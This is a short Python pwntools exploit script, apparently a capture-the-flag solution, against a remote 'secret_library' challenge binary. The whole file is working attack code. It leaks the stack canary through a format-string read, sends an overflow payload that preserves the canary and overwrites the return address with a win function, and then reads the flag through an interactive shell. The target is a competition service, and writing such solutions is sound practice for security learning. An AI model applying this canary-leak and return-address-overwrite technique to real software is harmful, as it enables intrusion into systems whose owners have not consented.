#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./secret_library", checksec=False)

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13556)

# Your exploit here
win_addr = 0x00401262
ret_addr = 0x000000000040101a
# stack canry found with the format string, using AAAA.%lx ...
CANARY_IDX = 23
# canary offset found with cyclic and gdb
CANARY_OFFSET = 136

p.recvuntil(b'guestbook:')
p.sendline(f"%{CANARY_IDX}$lx".encode())
leak = p.recvline().strip().split()
canary = int(leak[1], 16)
print(f'canary: {canary:#x}')

payload = flat(
    b'A' * CANARY_OFFSET,
    p64(canary),
    b'A' * 8,
    p64(ret_addr),
    p64(win_addr),
)

p.recvuntil(b"review:")
p.send(payload)

sleep(0.5)
p.sendline(b'cat flag')
p.interactive()
